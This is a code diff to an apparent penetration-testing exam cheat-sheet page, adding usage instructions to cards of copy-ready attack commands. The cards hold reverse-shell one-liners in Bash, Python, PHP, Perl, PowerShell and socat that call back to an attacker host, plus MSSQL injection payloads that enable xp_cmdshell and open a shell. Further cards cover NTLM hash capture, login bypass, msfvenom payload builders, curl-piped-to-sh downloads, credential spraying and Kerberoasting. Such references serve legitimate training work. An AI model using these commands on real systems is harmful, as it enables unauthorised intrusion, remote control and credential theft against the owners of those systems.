@@ -50,6 +50,8 @@ h1{font-size:19px;color:var(--head);margin:0 0 2px}
 .card .h .t{font-size:13px;font-weight:600;color:var(--head)}
 .card .h .d{font-size:11.5px;color:var(--muted);font-weight:400}
 .card .h .tag{font-size:10.5px;background:transparent;color:var(--tag);border:1px solid var(--border2);border-radius:20px;padding:1px 8px;white-space:nowrap}
+.card .use{font-size:12px;color:var(--muted);padding:8px 14px 11px;border-top:1px solid var(--border);line-height:1.55}
+.card .use b{color:var(--head)}
 .copy{background:var(--accent);color:#fff;border:none;border-radius:7px;padding:6px 13px;cursor:pointer;font-size:12px;font-weight:600;white-space:nowrap}
 .copy:hover{filter:brightness(1.1)} .copy.ok{background:var(--good)}
 pre{margin:0;padding:12px 14px;background:var(--code);overflow:auto;white-space:pre-wrap;word-break:break-all;
@@ -94,77 +96,77 @@ function psRev(L,P){const ps=`$client = New-Object System.Net.Sockets.TCPClient(
 // category → [ {t:title, d:desc, tag, cmd:(v)=>string} ]
 const CATS={
  "Reverse Shells":[
-   {t:"Bash",d:"Linux · most common",tag:"[SHELL-QUICK]",cmd:v=>`bash -c 'bash -i >& /dev/tcp/${v.L}/${v.P} 0>&1'`},
-   {t:"Bash (mkfifo)",d:"when bash -i fails",cmd:v=>`rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc ${v.L} ${v.P} >/tmp/f`},
-   {t:"Python3",d:"Linux · gives a pty",cmd:v=>`python3 -c 'import socket,os,pty;s=socket.socket();s.connect(("${v.L}",${v.P}));[os.dup2(s.fileno(),f) for f in(0,1,2)];pty.spawn("/bin/bash")'`},
-   {t:"PHP",d:"web / php host",cmd:v=>`php -r '$s=fsockopen("${v.L}",${v.P});exec("/bin/sh -i <&3 >&3 2>&3");'`},
-   {t:"Perl",d:"Linux",cmd:v=>`perl -e 'use Socket;$i="${v.L}";$p=${v.P};socket(S,PF_INET,SOCK_STREAM,getprotobyname("tcp"));if(connect(S,sockaddr_in($p,inet_aton($i)))){open(STDIN,">&S");open(STDOUT,">&S");open(STDERR,">&S");exec("/bin/sh -i");};'`},
-   {t:"Netcat -e",d:"if nc supports -e",cmd:v=>`nc ${v.L} ${v.P} -e /bin/bash`},
-   {t:"Netcat.exe (Windows)",d:"transfer nc.exe first",cmd:v=>`nc.exe ${v.L} ${v.P} -e cmd.exe`},
-   {t:"PowerShell (base64)",d:"Windows · powershell -e",tag:"[SHELL-WINDOWS]",cmd:v=>psRev(v.L,v.P)},
-   {t:"PowerShell (raw)",d:"Windows · paste in a PS shell",cmd:v=>`powershell -nop -c "$c=New-Object Net.Sockets.TCPClient('${v.L}',${v.P});$s=$c.GetStream();[byte[]]$b=0..65535|%{0};while(($i=$s.Read($b,0,$b.Length)) -ne 0){$d=(New-Object Text.ASCIIEncoding).GetString($b,0,$i);$r=(iex $d 2>&1|Out-String);$s2=$r+'PS '+(pwd).Path+'> ';$sb=[Text.Encoding]::ASCII.GetBytes($s2);$s.Write($sb,0,$sb.Length);$s.Flush()}"`},
-   {t:"socat (full TTY)",d:"target side · best TTY",cmd:v=>`socat exec:'bash -li',pty,stderr,setsid,sigint,sane tcp:${v.L}:${v.P}`},
+   {t:"Bash",d:"Linux · most common",tag:"[SHELL-QUICK]",use:"On a LINUX target, anywhere you can run a command (web RCE, cron, SSH). Start a Netcat listener on Kali first, then run this on the target — it dials back to you.",cmd:v=>`bash -c 'bash -i >& /dev/tcp/${v.L}/${v.P} 0>&1'`},
+   {t:"Bash (mkfifo)",d:"when bash -i fails",use:"Linux target when the plain Bash one-liner doesn't connect (older/limited /bin/sh). Same idea — run on target, catch on your nc listener.",cmd:v=>`rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc ${v.L} ${v.P} >/tmp/f`},
+   {t:"Python3",d:"Linux · gives a pty",use:"Linux target that has python3. Best when you want a proper PTY from the start (fewer shell problems). Run on target, catch on nc.",cmd:v=>`python3 -c 'import socket,os,pty;s=socket.socket();s.connect(("${v.L}",${v.P}));[os.dup2(s.fileno(),f) for f in(0,1,2)];pty.spawn("/bin/bash")'`},
+   {t:"PHP",d:"web / php host",use:"Through a PHP webshell, or on a box running PHP (e.g. after a file-upload RCE). Run it via the webshell; catch on nc.",cmd:v=>`php -r '$s=fsockopen("${v.L}",${v.P});exec("/bin/sh -i <&3 >&3 2>&3");'`},
+   {t:"Perl",d:"Linux",use:"Niche fallback — a Linux target that has perl but no python/bash reverse shell. Run on target, catch on nc.",cmd:v=>`perl -e 'use Socket;$i="${v.L}";$p=${v.P};socket(S,PF_INET,SOCK_STREAM,getprotobyname("tcp"));if(connect(S,sockaddr_in($p,inet_aton($i)))){open(STDIN,">&S");open(STDOUT,">&S");open(STDERR,">&S");exec("/bin/sh -i");};'`},
+   {t:"Netcat -e",d:"if nc supports -e",use:"Only works if the target's netcat has the -e flag (rare on modern Linux). Quick but unreliable — prefer Bash/Python.",cmd:v=>`nc ${v.L} ${v.P} -e /bin/bash`},
+   {t:"Netcat.exe (Windows)",d:"transfer nc.exe first",use:"Windows target — AFTER you transfer nc.exe to it (File Transfer tab). Run on the target; catch on nc.",cmd:v=>`nc.exe ${v.L} ${v.P} -e cmd.exe`},
+   {t:"PowerShell (base64)",d:"Windows · powershell -e",tag:"[SHELL-WINDOWS]",use:"The go-to WINDOWS reverse shell. Run via any Windows RCE — paste in cmd, or feed to certutil-download+run, xp_cmdshell, or PrintSpoofer -c. Catch on nc.",cmd:v=>psRev(v.L,v.P)},
+   {t:"PowerShell (raw)",d:"Windows · paste in a PS shell",use:"When you're ALREADY in a PowerShell prompt on the target and want to paste a plain one-liner (no base64). Catch on nc.",cmd:v=>`powershell -nop -c "$c=New-Object Net.Sockets.TCPClient('${v.L}',${v.P});$s=$c.GetStream();[byte[]]$b=0..65535|%{0};while(($i=$s.Read($b,0,$b.Length)) -ne 0){$d=(New-Object Text.ASCIIEncoding).GetString($b,0,$i);$r=(iex $d 2>&1|Out-String);$s2=$r+'PS '+(pwd).Path+'> ';$sb=[Text.Encoding]::ASCII.GetBytes($s2);$s.Write($sb,0,$sb.Length);$s.Flush()}"`},
+   {t:"socat (full TTY)",d:"target side · best TTY",use:"Linux target that has socat — gives the BEST interactive TTY. Must pair with the socat listener (Listeners tab), not plain nc.",cmd:v=>`socat exec:'bash -li',pty,stderr,setsid,sigint,sane tcp:${v.L}:${v.P}`},
  ],
  "SQLi → RCE (MSSQL)":[
-   {t:"xp_cmdshell → PS reverse shell (FULL login payload)",d:"paste straight into the vulnerable field · uses L/P",tag:"[SQLI-MSSQL]",cmd:v=>`'; EXEC sp_configure 'show advanced options',1;RECONFIGURE;EXEC sp_configure 'xp_cmdshell',1;RECONFIGURE;EXEC xp_cmdshell '${psRev(v.L,v.P)}';-- -`},
-   {t:"Enable xp_cmdshell only",d:"turn command-exec on",cmd:v=>`'; EXEC sp_configure 'show advanced options',1;RECONFIGURE;EXEC sp_configure 'xp_cmdshell',1;RECONFIGURE;-- -`},
-   {t:"Run one command",d:"after it's enabled",cmd:v=>`'; EXEC xp_cmdshell 'whoami';-- -`},
-   {t:"Capture NTLM hash",d:"→ Responder ANALYZE / relay",cmd:v=>`'; EXEC xp_dirtree '\\\\${v.L}\\x';-- -`},
-   {t:"Auth bypass",d:"log in as the first user",cmd:v=>`' or 1=1-- -`},
-   {t:"Detect (break the query)",d:"error = injectable",cmd:v=>`'`},
+   {t:"xp_cmdshell → PS reverse shell (FULL login payload)",d:"paste straight into the vulnerable field · uses L/P",tag:"[SQLI-MSSQL]",use:"Paste into a VULNERABLE WEB INPUT whose backend is Microsoft SQL Server (a login username box, search field, etc.). Turns SQLi into a reverse shell as the SQL service account. Start an nc listener first.",cmd:v=>`'; EXEC sp_configure 'show advanced options',1;RECONFIGURE;EXEC sp_configure 'xp_cmdshell',1;RECONFIGURE;EXEC xp_cmdshell '${psRev(v.L,v.P)}';-- -`},
+   {t:"Enable xp_cmdshell only",d:"turn command-exec on",use:"Same vulnerable MSSQL field — step 1: switch command-execution on. Then use 'Run one command'.",cmd:v=>`'; EXEC sp_configure 'show advanced options',1;RECONFIGURE;EXEC sp_configure 'xp_cmdshell',1;RECONFIGURE;-- -`},
+   {t:"Run one command",d:"after it's enabled",use:"After xp_cmdshell is enabled — run any single OS command through the injection to test or explore (swap 'whoami').",cmd:v=>`'; EXEC xp_cmdshell 'whoami';-- -`},
+   {t:"Capture NTLM hash",d:"→ Responder ANALYZE / relay",use:"In an MSSQL injection (or mssqlclient) — forces the SQL server to authenticate to YOUR Responder (run it in ANALYZE mode). Gives a NetNTLM hash to crack or relay.",cmd:v=>`'; EXEC xp_dirtree '\\\\${v.L}\\x';-- -`},
+   {t:"Auth bypass",d:"log in as the first user",use:"Type into a LOGIN form's username field (password anything) to log in without valid creds — when the login is SQLi-vulnerable.",cmd:v=>`' or 1=1-- -`},
+   {t:"Detect (break the query)",d:"error = injectable",use:"Type a single quote into ANY input you suspect. A SQL error or broken page = it's injectable. Your first SQLi test.",cmd:v=>`'`},
  ],
  "Listeners":[
-   {t:"Netcat",d:"catch the shell",tag:"[SHELL-QUICK]",cmd:v=>`nc -lvnp ${v.P}`},
-   {t:"rlwrap Netcat",d:"arrow keys / history",cmd:v=>`rlwrap nc -lvnp ${v.P}`},
-   {t:"socat (full TTY)",d:"your side · pairs with socat rev",cmd:v=>`socat file:\`tty\`,raw,echo=0 tcp-listen:${v.P}`},
-   {t:"Metasploit handler",d:"⚠️ your ONE MSF box only",cmd:v=>`msfconsole -q -x "use exploit/multi/handler;set payload windows/x64/meterpreter/reverse_tcp;set LHOST ${v.L};set LPORT ${v.P};run"`},
+   {t:"Netcat",d:"catch the shell",tag:"[SHELL-QUICK]",use:"On your KALI — run this BEFORE firing any reverse shell, to catch the incoming connection. The #1 forgotten step.",cmd:v=>`nc -lvnp ${v.P}`},
+   {t:"rlwrap Netcat",d:"arrow keys / history",use:"On Kali — same as nc but gives you arrow keys + command history in the caught shell. Nicer for interactive work.",cmd:v=>`rlwrap nc -lvnp ${v.P}`},
+   {t:"socat (full TTY)",d:"your side · pairs with socat rev",use:"On Kali — the matching listener for the socat reverse shell (full TTY). Don't use it to catch plain shells.",cmd:v=>`socat file:\`tty\`,raw,echo=0 tcp-listen:${v.P}`},
+   {t:"Metasploit handler",d:"⚠️ your ONE MSF box only",use:"On Kali — catches a meterpreter/msf payload. ⚠️ Using Metasploit locks you to ONE exam target — save it.",cmd:v=>`msfconsole -q -x "use exploit/multi/handler;set payload windows/x64/meterpreter/reverse_tcp;set LHOST ${v.L};set LPORT ${v.P};run"`},
  ],
  "File Transfer":[
-   {t:"Serve (Kali)",d:"host the current dir",tag:"[FILETRANSFER-QUICK]",cmd:v=>`python3 -m http.server 80`},
-   {t:"SMB server (Kali)",d:"great for Windows",cmd:v=>`impacket-smbserver share $(pwd) -smb2support`},
-   {t:"Linux pull (wget)",d:"on the target",cmd:v=>`wget http://${v.L}/${v.F} -O /tmp/${v.F}`},
-   {t:"Linux pull (curl)",d:"on the target",cmd:v=>`curl http://${v.L}/${v.F} -o /tmp/${v.F}`},
-   {t:"Windows pull (certutil)",d:"on the target",cmd:v=>`certutil -urlcache -split -f http://${v.L}/${v.F} ${v.F}`},
-   {t:"Windows pull (IWR)",d:"PowerShell",cmd:v=>`powershell -c "iwr http://${v.L}/${v.F} -OutFile ${v.F}"`},
-   {t:"Windows pull (WebClient)",d:"old PowerShell",cmd:v=>`powershell -c "(New-Object Net.WebClient).DownloadFile('http://${v.L}/${v.F}','C:\\Windows\\Temp\\${v.F}')"`},
-   {t:"SMB copy (Windows)",d:"after impacket-smbserver",cmd:v=>`copy \\\\${v.L}\\share\\${v.F} .`},
+   {t:"Serve (Kali)",d:"host the current dir",tag:"[FILETRANSFER-QUICK]",use:"On KALI — run inside the folder holding the file you want to send. Targets then download from http://<your-Kali-IP>/<file>.",cmd:v=>`python3 -m http.server 80`},
+   {t:"SMB server (Kali)",d:"great for Windows",use:"On Kali — best for WINDOWS targets (they pull via \\\\<KaliIP>\\share). Add -user/-password if the target refuses anonymous SMB.",cmd:v=>`impacket-smbserver share $(pwd) -smb2support`},
+   {t:"Linux pull (wget)",d:"on the target",use:"ON THE TARGET (Linux) — download a file from your Kali http.server. Fill the FILE field up top.",cmd:v=>`wget http://${v.L}/${v.F} -O /tmp/${v.F}`},
+   {t:"Linux pull (curl)",d:"on the target",use:"On the target (Linux) — same as wget, for when wget is missing.",cmd:v=>`curl http://${v.L}/${v.F} -o /tmp/${v.F}`},
+   {t:"Windows pull (certutil)",d:"on the target",use:"On the target (Windows cmd/PS) — the classic downloader. Pulls from your Kali http.server (must be running).",cmd:v=>`certutil -urlcache -split -f http://${v.L}/${v.F} ${v.F}`},
+   {t:"Windows pull (IWR)",d:"PowerShell",use:"On the target (modern PowerShell) — download via Invoke-WebRequest.",cmd:v=>`powershell -c "iwr http://${v.L}/${v.F} -OutFile ${v.F}"`},
+   {t:"Windows pull (WebClient)",d:"old PowerShell",use:"On the target (OLDER PowerShell, where IWR fails) — download via .NET WebClient.",cmd:v=>`powershell -c "(New-Object Net.WebClient).DownloadFile('http://${v.L}/${v.F}','C:\\Windows\\Temp\\${v.F}')"`},
+   {t:"SMB copy (Windows)",d:"after impacket-smbserver",use:"On the target (Windows) — pull a file from your impacket-smbserver share (started on Kali).",cmd:v=>`copy \\\\${v.L}\\share\\${v.F} .`},
  ],
  "TTY Upgrade":[
-   {t:"Python pty (step 1)",d:"then Ctrl-Z",tag:"[SHELL-STABILIZE]",cmd:v=>`python3 -c 'import pty;pty.spawn("/bin/bash")'`},
-   {t:"stty (step 2)",d:"after Ctrl-Z, then Enter twice",cmd:v=>`stty raw -echo; fg`},
-   {t:"set term (step 3)",d:"in the restored shell",cmd:v=>`export TERM=xterm; export SHELL=/bin/bash; stty rows 50 columns 200`},
-   {t:"script alternative",d:"if python missing",cmd:v=>`script -qc /bin/bash /dev/null`},
+   {t:"Python pty (step 1)",d:"then Ctrl-Z",tag:"[SHELL-STABILIZE]",use:"Run IN a freshly-caught dumb reverse shell (Linux) to spawn a real bash. THEN press Ctrl-Z to background it.",cmd:v=>`python3 -c 'import pty;pty.spawn("/bin/bash")'`},
+   {t:"stty (step 2)",d:"after Ctrl-Z, then Enter twice",use:"On YOUR KALI (after the Ctrl-Z) — fixes the terminal and foregrounds the shell. Press Enter twice afterwards.",cmd:v=>`stty raw -echo; fg`},
+   {t:"set term (step 3)",d:"in the restored shell",use:"Back IN the target shell — sets terminal type + size so clear/vim/less/arrow-keys work properly.",cmd:v=>`export TERM=xterm; export SHELL=/bin/bash; stty rows 50 columns 200`},
+   {t:"script alternative",d:"if python missing",use:"In the target shell when python isn't available — alternative way to get a PTY.",cmd:v=>`script -qc /bin/bash /dev/null`},
  ],
  "Enumeration":[
-   {t:"Nmap full TCP",d:"all ports fast",tag:"[NMAP-QUICK]",cmd:v=>`nmap -p- --min-rate 2000 -Pn -oN scans/all-tcp.txt ${v.R}`},
-   {t:"Nmap service scan",d:"on the open ports",cmd:v=>`nmap -p<csv> -sCV -Pn -oN scans/scv.txt ${v.R}`},
-   {t:"Nmap UDP top100",d:"catch SNMP/DNS/TFTP",cmd:v=>`nmap -sU --top-ports 100 --min-rate 1000 -Pn -oN scans/udp.txt ${v.R}`},
-   {t:"feroxbuster",d:"web dir brute",tag:"[WEB-QUICK]",cmd:v=>`feroxbuster -u http://${v.R} -w /usr/share/seclists/Discovery/Web-Content/raft-medium-directories.txt -x php,txt,html`},
-   {t:"nxc SMB (null)",d:"shares + users",tag:"[SMB-QUICK]",cmd:v=>`nxc smb ${v.R} -u '' -p '' --shares --users`},
-   {t:"enum4linux-ng",d:"one-shot SMB/RPC/LDAP",cmd:v=>`enum4linux-ng -A ${v.R}`},
-   {t:"whatweb",d:"web fingerprint",cmd:v=>`whatweb http://${v.R}`},
+   {t:"Nmap full TCP",d:"all ports fast",tag:"[NMAP-QUICK]",use:"On Kali — your FIRST command on any new target. Finds every open port. Fill the TARGET field up top.",cmd:v=>`nmap -p- --min-rate 2000 -Pn -oN scans/all-tcp.txt ${v.R}`},
+   {t:"Nmap service scan",d:"on the open ports",use:"On Kali — run AFTER the full scan; replace <csv> with the open ports (e.g. 22,80,445) to get versions + default scripts.",cmd:v=>`nmap -p<csv> -sCV -Pn -oN scans/scv.txt ${v.R}`},
+   {t:"Nmap UDP top100",d:"catch SNMP/DNS/TFTP",use:"On Kali — catches UDP-only services (SNMP 161, DNS 53, TFTP 69) that TCP scans miss.",cmd:v=>`nmap -sU --top-ports 100 --min-rate 1000 -Pn -oN scans/udp.txt ${v.R}`},
+   {t:"feroxbuster",d:"web dir brute",tag:"[WEB-QUICK]",use:"On Kali — brute-force hidden web dirs/files on an open HTTP port. Add -x aspx for ASP.NET, php for PHP sites.",cmd:v=>`feroxbuster -u http://${v.R} -w /usr/share/seclists/Discovery/Web-Content/raft-medium-directories.txt -x php,txt,html`},
+   {t:"nxc SMB (null)",d:"shares + users",tag:"[SMB-QUICK]",use:"On Kali — try to list SMB shares/users with NO credentials on a Windows target (ports 139/445).",cmd:v=>`nxc smb ${v.R} -u '' -p '' --shares --users`},
+   {t:"enum4linux-ng",d:"one-shot SMB/RPC/LDAP",use:"On Kali — one-shot automated SMB/RPC/LDAP enumeration of a Windows/AD host.",cmd:v=>`enum4linux-ng -A ${v.R}`},
+   {t:"whatweb",d:"web fingerprint",use:"On Kali — fingerprint a website's server + CMS + version. The version is your lead → searchsploit it.",cmd:v=>`whatweb http://${v.R}`},
  ],
  "Cred Spray":[
-   {t:"nxc SMB",d:"validate on SMB",tag:"[CREDENTIALS-QUICK]",cmd:v=>`nxc smb ${v.R} -u '${v.U}' -p '${v.W}' --shares`},
-   {t:"nxc WinRM",d:"(Pwn3d!) = shell",cmd:v=>`nxc winrm ${v.R} -u '${v.U}' -p '${v.W}'`},
-   {t:"nxc every service",d:"validate across all",cmd:v=>`for s in smb winrm ldap mssql rdp ssh; do echo "== $s =="; nxc $s ${v.R} -u '${v.U}' -p '${v.W}' --continue-on-success; done`},
-   {t:"evil-winrm login",d:"get the shell",cmd:v=>`evil-winrm -i ${v.R} -u '${v.U}' -p '${v.W}'`},
-   {t:"Kerberoast",d:"needs any domain cred",tag:"[AD-KERBEROAST]",cmd:v=>`impacket-GetUserSPNs -request DOMAIN/${v.U}:'${v.W}' -dc-ip ${v.R}`},
+   {t:"nxc SMB",d:"validate on SMB",tag:"[CREDENTIALS-QUICK]",use:"On Kali — test a found USER/PASS (fill the fields up top) on SMB. '(Pwn3d!)' in the output = local admin there.",cmd:v=>`nxc smb ${v.R} -u '${v.U}' -p '${v.W}' --shares`},
+   {t:"nxc WinRM",d:"(Pwn3d!) = shell",use:"On Kali — test creds on WinRM; '(Pwn3d!)' means you can get an evil-winrm shell on that host.",cmd:v=>`nxc winrm ${v.R} -u '${v.U}' -p '${v.W}'`},
+   {t:"nxc every service",d:"validate across all",use:"On Kali — throw ONE credential at smb/winrm/ldap/mssql/rdp/ssh at once, to instantly see everywhere it works.",cmd:v=>`for s in smb winrm ldap mssql rdp ssh; do echo "== $s =="; nxc $s ${v.R} -u '${v.U}' -p '${v.W}' --continue-on-success; done`},
+   {t:"evil-winrm login",d:"get the shell",use:"On Kali — get an interactive Windows shell once creds validate on WinRM (the (Pwn3d!) host).",cmd:v=>`evil-winrm -i ${v.R} -u '${v.U}' -p '${v.W}'`},
+   {t:"Kerberoast",d:"needs any domain cred",tag:"[AD-KERBEROAST]",use:"On Kali — with ANY one domain cred, request service-account hashes to crack offline. Replace DOMAIN; the target field = the DC IP.",cmd:v=>`impacket-GetUserSPNs -request DOMAIN/${v.U}:'${v.W}' -dc-ip ${v.R}`},
  ],
  "msfvenom":[
-   {t:"Windows exe",d:"non-meterpreter (catch w/ nc)",tag:"[MSF-MSFVENOM]",cmd:v=>`msfvenom -p windows/x64/shell_reverse_tcp LHOST=${v.L} LPORT=${v.P} -f exe -o rev.exe`},
-   {t:"Windows meterpreter",d:"⚠️ MSF box only",cmd:v=>`msfvenom -p windows/x64/meterpreter/reverse_tcp LHOST=${v.L} LPORT=${v.P} -f exe -o met.exe`},
-   {t:"Linux elf",d:"",cmd:v=>`msfvenom -p linux/x64/shell_reverse_tcp LHOST=${v.L} LPORT=${v.P} -f elf -o rev.elf`},
-   {t:"ASPX (IIS)",d:"webshell upload",cmd:v=>`msfvenom -p windows/x64/shell_reverse_tcp LHOST=${v.L} LPORT=${v.P} -f aspx -o sh.aspx`},
-   {t:"WAR (Tomcat)",d:"deploy via manager",cmd:v=>`msfvenom -p java/jsp_shell_reverse_tcp LHOST=${v.L} LPORT=${v.P} -f war -o sh.war`},
-   {t:"MSI (AlwaysInstallElevated)",d:"→ SYSTEM",cmd:v=>`msfvenom -p windows/x64/shell_reverse_tcp LHOST=${v.L} LPORT=${v.P} -f msi -o x.msi`},
+   {t:"Windows exe",d:"non-meterpreter (catch w/ nc)",tag:"[MSF-MSFVENOM]",use:"On Kali — build a reverse-shell .exe, transfer + run on a WINDOWS target, catch with plain nc. msfvenom payloads are exam-safe everywhere (it's Meterpreter that's limited).",cmd:v=>`msfvenom -p windows/x64/shell_reverse_tcp LHOST=${v.L} LPORT=${v.P} -f exe -o rev.exe`},
+   {t:"Windows meterpreter",d:"⚠️ MSF box only",use:"On Kali — ⚠️ Meterpreter counts as your ONE Metasploit target on the exam. Catch with the Metasploit handler (Listeners tab).",cmd:v=>`msfvenom -p windows/x64/meterpreter/reverse_tcp LHOST=${v.L} LPORT=${v.P} -f exe -o met.exe`},
+   {t:"Linux elf",d:"",use:"On Kali — reverse-shell binary for a LINUX target. Transfer + chmod +x + run; catch on nc.",cmd:v=>`msfvenom -p linux/x64/shell_reverse_tcp LHOST=${v.L} LPORT=${v.P} -f elf -o rev.elf`},
+   {t:"ASPX (IIS)",d:"webshell upload",use:"On Kali — build an .aspx shell to UPLOAD to an IIS/ASP.NET site, then browse it to fire the shell. Catch on nc.",cmd:v=>`msfvenom -p windows/x64/shell_reverse_tcp LHOST=${v.L} LPORT=${v.P} -f aspx -o sh.aspx`},
+   {t:"WAR (Tomcat)",d:"deploy via manager",use:"On Kali — build a .war to DEPLOY via Tomcat's Manager app (/manager/html, needs creds). Visiting the app fires the shell.",cmd:v=>`msfvenom -p java/jsp_shell_reverse_tcp LHOST=${v.L} LPORT=${v.P} -f war -o sh.war`},
+   {t:"MSI (AlwaysInstallElevated)",d:"→ SYSTEM",use:"On Kali — use when Windows privesc check shows AlwaysInstallElevated=1. Run on target: msiexec /quiet /qn /i x.msi → SYSTEM.",cmd:v=>`msfvenom -p windows/x64/shell_reverse_tcp LHOST=${v.L} LPORT=${v.P} -f msi -o x.msi`},
  ],
  "Privesc download":[
-   {t:"linpeas (in memory)",d:"Linux · no disk",tag:"[LINPEAS-WORKFLOW]",cmd:v=>`curl http://${v.L}/linpeas.sh | sh`},
-   {t:"linpeas (to file)",d:"Linux",cmd:v=>`wget http://${v.L}/linpeas.sh -O /tmp/lp.sh; chmod +x /tmp/lp.sh; /tmp/lp.sh | tee /tmp/lp.txt`},
-   {t:"winPEAS",d:"Windows",tag:"[WINPEAS-WORKFLOW]",cmd:v=>`certutil -urlcache -split -f http://${v.L}/winPEASx64.exe wp.exe & wp.exe`},
-   {t:"PrintSpoofer",d:"SeImpersonate → SYSTEM",tag:"[WINDOWS-TOKENS]",cmd:v=>`certutil -urlcache -split -f http://${v.L}/PrintSpoofer64.exe ps.exe & ps.exe -i -c cmd`},
-   {t:"pspy",d:"watch processes/cron",cmd:v=>`wget http://${v.L}/pspy64 -O /tmp/pspy; chmod +x /tmp/pspy; /tmp/pspy`},
+   {t:"linpeas (in memory)",d:"Linux · no disk",tag:"[LINPEAS-WORKFLOW]",use:"ON THE TARGET (Linux) — run linpeas straight from your Kali http.server without writing to disk. Read the RED/YELLOW findings.",cmd:v=>`curl http://${v.L}/linpeas.sh | sh`},
+   {t:"linpeas (to file)",d:"Linux",use:"On the target (Linux) — download + run + save the output to a file so you can scroll it calmly.",cmd:v=>`wget http://${v.L}/linpeas.sh -O /tmp/lp.sh; chmod +x /tmp/lp.sh; /tmp/lp.sh | tee /tmp/lp.txt`},
+   {t:"winPEAS",d:"Windows",tag:"[WINPEAS-WORKFLOW]",use:"On the target (Windows) — download + run the Windows privesc scanner from your Kali http.server.",cmd:v=>`certutil -urlcache -split -f http://${v.L}/winPEASx64.exe wp.exe & wp.exe`},
+   {t:"PrintSpoofer",d:"SeImpersonate → SYSTEM",tag:"[WINDOWS-TOKENS]",use:"On the target (Windows) when 'whoami /priv' shows SeImpersonate — download + run → SYSTEM. If -i fails, see [POTATO-GOTCHAS] (use -c + a reverse shell).",cmd:v=>`certutil -urlcache -split -f http://${v.L}/PrintSpoofer64.exe ps.exe & ps.exe -i -c cmd`},
+   {t:"pspy",d:"watch processes/cron",use:"On the target (Linux) — watch processes/cron jobs live to catch a root-run job you can hijack for privesc.",cmd:v=>`wget http://${v.L}/pspy64 -O /tmp/pspy; chmod +x /tmp/pspy; /tmp/pspy`},
  ],
 };
 
@@ -177,7 +179,7 @@ function renderCards(){
     const cmd=c.cmd(v);
     return `<div class="card"><div class="h"><div><span class="t">${c.t}</span> ${c.d?`<span class="d">— ${c.d}</span>`:''}</div>
       <div style="display:flex;gap:8px;align-items:center">${c.tag?`<span class="tag">${c.tag}</span>`:''}<button class="copy" data-i="${i}" onclick="copyCmd(this)">Copy</button></div></div>
-      <pre id="cmd${i}">${esc(cmd)}</pre></div>`;
+      <pre id="cmd${i}">${esc(cmd)}</pre>${c.use?`<div class="use">▸ <b>Use:</b> ${c.use}</div>`:''}</div>`;
   }).join('');
 }
 function copyCmd(btn){
